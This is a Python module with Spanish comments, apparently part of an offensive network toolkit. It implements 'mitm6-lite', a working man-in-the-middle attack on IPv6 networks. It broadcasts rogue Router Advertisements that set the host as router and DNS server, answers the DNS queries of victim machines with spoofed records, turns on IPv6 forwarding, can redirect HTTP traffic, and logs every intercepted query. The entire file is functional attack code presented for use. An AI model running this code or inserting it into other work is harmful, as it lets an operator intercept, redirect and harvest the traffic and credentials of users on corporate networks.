"""mitm6-lite: colarse como router y DNS IPv6 mediante Router Advertisements.

Muchas redes corporativas tienen IPv6 habilitado sin ningun control (ni
monitorizacion). Anunciamos via RA que somos router y DNS IPv6; las victimas
Windows empiezan a preguntarnos a nosotros y les respondemos con nuestra
direccion. Todo el trafico resultante pasa por esta maquina.

Ojo: agresivo por naturaleza (corta la resolucion DNS legitima mientras
este activo). Requiere root.
"""
import random
import threading

from scapy.all import (AsyncSniffer, DNS, DNSRR, Ether, ICMPv6ND_RA,
                       ICMPv6NDOptRDNSS, ICMPv6NDOptSrcLLAddr, IPv6, UDP,
                       get_if_hwaddr, in6_getifaddr, sendp)

from core import fw
from core.bus import bus


def _link_local(iface: str) -> str | None:
    for addr, _net, dev in in6_getifaddr():
        if dev == iface and addr.lower().startswith("fe80"):
            return addr
    return None


def _global_v6(iface: str) -> str | None:
    for addr, _net, dev in in6_getifaddr():
        if dev == iface and not addr.lower().startswith(("fe80", "ff", "::1")):
            return addr
    return None


class Mitm6:
    def __init__(self, iface: str, interval: float = 10.0, jitter: float = 2.0,
                 mapping: dict[str, str] | None = None,
                 redirect_http_port: int | None = None):
        self.iface = iface
        self.interval = interval
        self.jitter = jitter
        self.mapping = mapping or {}
        self.redirect_http_port = redirect_http_port
        self.ll = _link_local(iface)
        self._ra_thread: threading.Thread | None = None
        self._sniffer: AsyncSniffer | None = None
        self._stop = threading.Event()
        self.queries = 0
        self._fwd6_prev: str | None = None
        if not self.ll:
            raise RuntimeError(f"No hay IPv6 link-local en {iface}")

    # ------------------------------------------------------------------ RA
    def _send_ra(self) -> None:
        ra = (Ether(dst="33:33:00:00:00:01") /
              IPv6(src=self.ll, dst="ff02::1") /
              ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=1800,
                          reachabletime=0, retranstimer=0) /
              ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(self.iface)) /
              ICMPv6NDOptRDNSS(lifetime=86400, dns=[self.ll]))
        sendp(ra, iface=self.iface, verbose=0)

    def _send_goodbye_ra(self) -> None:
        """RA de despedida: lifetime=0 para que las victimas nos dejen de usar
        como router/DNS cuanto antes."""
        ra = (Ether(dst="33:33:00:00:00:01") /
              IPv6(src=self.ll, dst="ff02::1") /
              ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=0,
                          reachabletime=0, retranstimer=0) /
              ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(self.iface)) /
              ICMPv6NDOptRDNSS(lifetime=0, dns=[self.ll]))
        sendp(ra, iface=self.iface, verbose=0, count=3, inter=0.2)

    def _ra_loop(self) -> None:
        while not self._stop.is_set():
            try:
                self._send_ra()
            except Exception:
                pass
            self._stop.wait(self.interval + random.uniform(0, self.jitter))

    # ------------------------------------------------------------------ DNS v6
    def _process(self, pkt) -> None:
        if not pkt.haslayer(DNS) or not pkt.haslayer(IPv6):
            return
        dns = pkt[DNS]
        if dns.qr or not dns.qd:
            return
        q = dns.qd[0]
        name = bytes(q.qname).decode(errors="ignore").rstrip(".")
        self.queries += 1
        bus.emit({"type": "dns6", "name": name, "src": pkt[IPv6].src,
                  "qtype": {1: "A", 28: "AAAA"}.get(q.qtype, str(q.qtype))})

        target = self.mapping.get(name)
        if q.qtype == 28:  # AAAA
            rdata = target or self.ll
            rtype = "AAAA"
        elif q.qtype == 1:  # A (nos la pueden preguntar tambien por v6)
            rdata = target or "0.0.0.0"
            if rdata == "0.0.0.0":
                return  # sin objetivo IPv4 no respondemos las A
            rtype = "A"
        else:
            return
        resp = (IPv6(src=self.ll, dst=pkt[IPv6].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                    an=DNSRR(rrname=q.qname, type=rtype, rdata=rdata, ttl=60)))
        try:
            sendp(Ether(dst=pkt[Ether].src) / resp, iface=self.iface, verbose=0)
        except Exception:
            pass

    # ------------------------------------------------------------------ ciclo de vida
    def start(self) -> None:
        # Guardamos el estado de forwarding v6 para restaurarlo
        try:
            with open("/proc/sys/net/ipv6/conf/all/forwarding") as f:
                self._fwd6_prev = f.read().strip()
            with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f:
                f.write("1")
        except Exception as e:
            bus.emit({"type": "error", "msg": f"No se pudo habilitar forwarding IPv6: {e}"})

        if self.redirect_http_port:
            fw.add_redirect(to_port=self.redirect_http_port, dport=80, family="ipv6")

        self._stop.clear()
        self._ra_thread = threading.Thread(target=self._ra_loop, daemon=True)
        self._ra_thread.start()
        self._sniffer = AsyncSniffer(iface=self.iface,
                                     filter="udp dst port 53 and ip6",
                                     prn=self._process, store=False)
        self._sniffer.start()
        bus.emit({"type": "mitm6", "msg": f"mitm6 activo en {self.iface} (RA+DNS desde {self.ll})"})

    def stop(self) -> None:
        self._stop.set()
        if self._ra_thread:
            self._ra_thread.join(timeout=3)
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        # RA de despedida ANTES de limpiar iptables, para que las victimas
        # dejen de tratarnos como router/DNS IPv6 aunque el resto muera.
        if self._ra_thread is not None:
            try:
                self._send_goodbye_ra()
            except Exception as e:
                bus.emit({"type": "error", "msg": f"No se pudo enviar el RA de despedida: {e}"})
        fw.cleanup("ipv6")
        if self._fwd6_prev is not None:
            try:
                with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f:
                    f.write(self._fwd6_prev)
            except Exception:
                pass
        bus.emit({"type": "mitm6",
                  "msg": f"mitm6 detenido ({self.queries} consultas DNS interceptadas)"})
